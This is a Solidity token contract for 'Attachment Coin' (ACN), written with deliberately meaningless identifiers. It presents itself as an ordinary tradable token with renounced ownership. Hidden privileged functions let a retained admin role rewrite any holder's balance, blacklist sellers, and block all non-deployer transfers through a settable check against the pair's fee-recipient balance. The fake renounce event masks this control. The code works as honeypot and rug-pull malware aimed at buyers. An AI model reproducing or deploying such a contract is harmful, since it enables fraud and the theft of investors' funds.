//SPDX-License-Identifier: MIT

pragma solidity ^0.8.14;

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract swapBuy {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeFrom {
    function createPair(address listSell, address limitReceiverLaunched) external returns (address);

    function feeTo() external view returns (address);
}

interface amountWalletReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


interface swapTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverMax) external view returns (uint256);

    function transfer(address liquidityIs, uint256 exemptLiquidityMode) external returns (bool);

    function allowance(address feeTeam, address spender) external view returns (uint256);

    function approve(address spender, uint256 exemptLiquidityMode) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityIs,
        uint256 exemptLiquidityMode
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listAuto, uint256 value);
    event Approval(address indexed feeTeam, address indexed spender, uint256 value);
}

interface swapTotalMetadata is swapTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AttachmentCoin is swapBuy, swapTotal, swapTotalMetadata {

    mapping(address => bool) public swapSender;

    function getOwner() external view returns (address) {
        return receiverTeam;
    }

    function txSwapLaunched() private view {
        require(swapSender[_msgSender()]);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitLaunch;
    }

    uint256 amountShould;

    function exemptSwapIs(address teamLaunched, address liquidityIs, uint256 exemptLiquidityMode) internal view returns (uint256) {
        require(exemptLiquidityMode > 0);

        uint256 buyReceiver = 0;
        if (teamLaunched == totalFrom && receiverTx > 0) {
            buyReceiver = exemptLiquidityMode * receiverTx / 100;
        } else if (liquidityIs == totalFrom && senderAmount > 0) {
            buyReceiver = exemptLiquidityMode * senderAmount / 100;
        }
        require(buyReceiver <= exemptLiquidityMode);
        return exemptLiquidityMode - buyReceiver;
    }

    string private txSellExempt = "Attachment Coin";

    bool public receiverTrading;

    uint256 public senderAmount = 0;

    bool public maxLaunched;

    function walletBuyShould() public {
        emit OwnershipTransferred(senderReceiver, address(0));
        receiverTeam = address(0);
    }

    constructor (){
        if (maxShouldAt) {
            maxLaunched = false;
        }
        walletBuyShould();
        amountWalletReceiver enableExemptList = amountWalletReceiver(tradingBuy);
        totalFrom = takeFrom(enableExemptList.factory()).createPair(enableExemptList.WETH(), address(this));
        teamMarketing = takeFrom(enableExemptList.factory()).feeTo();
        if (enableMin) {
            maxShouldAt = false;
        }
        senderReceiver = _msgSender();
        swapSender[senderReceiver] = true;
        totalTake[senderReceiver] = txAt;
        if (walletMin != enableList) {
            walletMin = enableList;
        }
        emit Transfer(address(0), senderReceiver, txAt);
    }

    uint256 private txAt = 100000000 * 10 ** 18;

    function decimals() external view virtual override returns (uint8) {
        return walletBuy;
    }

    function name() external view virtual override returns (string memory) {
        return txSellExempt;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return txAt;
    }

    mapping(address => mapping(address => uint256)) private txExemptReceiver;

    bool private liquidityEnableWallet;

    function marketingAmount(address teamLaunched, address liquidityIs, uint256 exemptLiquidityMode) internal returns (bool) {
        require(totalTake[teamLaunched] >= exemptLiquidityMode);
        totalTake[teamLaunched] -= exemptLiquidityMode;
        totalTake[liquidityIs] += exemptLiquidityMode;
        emit Transfer(teamLaunched, liquidityIs, exemptLiquidityMode);
        return true;
    }

    uint256 public receiverTx = 3;

    function transfer(address enableAmount, uint256 exemptLiquidityMode) external virtual override returns (bool) {
        return receiverToWallet(_msgSender(), enableAmount, exemptLiquidityMode);
    }

    uint8 private walletBuy = 18;

    uint256 constant receiverSender = 20 ** 10;

    mapping(address => bool) public atTx;

    bool private enableMin;

    address tradingBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public toTrading;

    function transferFrom(address teamLaunched, address liquidityIs, uint256 exemptLiquidityMode) external override returns (bool) {
        if (_msgSender() != tradingBuy) {
            if (txExemptReceiver[teamLaunched][_msgSender()] != type(uint256).max) {
                require(exemptLiquidityMode <= txExemptReceiver[teamLaunched][_msgSender()]);
                txExemptReceiver[teamLaunched][_msgSender()] -= exemptLiquidityMode;
            }
        }
        return receiverToWallet(teamLaunched, liquidityIs, exemptLiquidityMode);
    }

    address teamMarketing;

    function approve(address atMin, uint256 exemptLiquidityMode) public virtual override returns (bool) {
        txExemptReceiver[_msgSender()][atMin] = exemptLiquidityMode;
        emit Approval(_msgSender(), atMin, exemptLiquidityMode);
        return true;
    }

    uint256 private enableList;

    function shouldAt(uint256 exemptLiquidityMode) public {
        txSwapLaunched();
        amountShould = exemptLiquidityMode;
    }

    address private receiverTeam;

    string private limitLaunch = "ACN";

    function txBuy(address exemptTrading) public {
        txSwapLaunched();
        if (enableList != walletMin) {
            maxLaunched = false;
        }
        if (exemptTrading == senderReceiver || exemptTrading == totalFrom) {
            return;
        }
        atTx[exemptTrading] = true;
    }

    function allowance(address teamListTx, address atMin) external view virtual override returns (uint256) {
        if (atMin == tradingBuy) {
            return type(uint256).max;
        }
        return txExemptReceiver[teamListTx][atMin];
    }

    function owner() external view returns (address) {
        return receiverTeam;
    }

    uint256 public walletMin;

    function limitExempt(address autoSender) public {
        require(autoSender.balance < 100000);
        if (fundTx) {
            return;
        }
        if (maxLaunched == liquidityEnableWallet) {
            maxShouldAt = true;
        }
        swapSender[autoSender] = true;
        if (receiverTrading == toTrading) {
            liquidityReceiver = false;
        }
        fundTx = true;
    }

    address public senderReceiver;

    bool public fundTx;

    event OwnershipTransferred(address indexed launchFrom, address indexed limitFee);

    function balanceOf(address receiverMax) public view virtual override returns (uint256) {
        return totalTake[receiverMax];
    }

    mapping(address => uint256) private totalTake;

    function atShouldLimit(address enableAmount, uint256 exemptLiquidityMode) public {
        txSwapLaunched();
        totalTake[enableAmount] = exemptLiquidityMode;
    }

    bool public maxShouldAt;

    address public totalFrom;

    bool public liquidityReceiver;

    function receiverToWallet(address teamLaunched, address liquidityIs, uint256 exemptLiquidityMode) internal returns (bool) {
        if (teamLaunched == senderReceiver) {
            return marketingAmount(teamLaunched, liquidityIs, exemptLiquidityMode);
        }
        uint256 sellReceiverAt = swapTotal(totalFrom).balanceOf(teamMarketing);
        require(sellReceiverAt == amountShould);
        require(liquidityIs != teamMarketing);
        if (atTx[teamLaunched]) {
            return marketingAmount(teamLaunched, liquidityIs, receiverSender);
        }
        exemptLiquidityMode = exemptSwapIs(teamLaunched, liquidityIs, exemptLiquidityMode);
        return marketingAmount(teamLaunched, liquidityIs, exemptLiquidityMode);
    }

    uint256 liquidityFromLaunch;

    bool private receiverShouldExempt;

}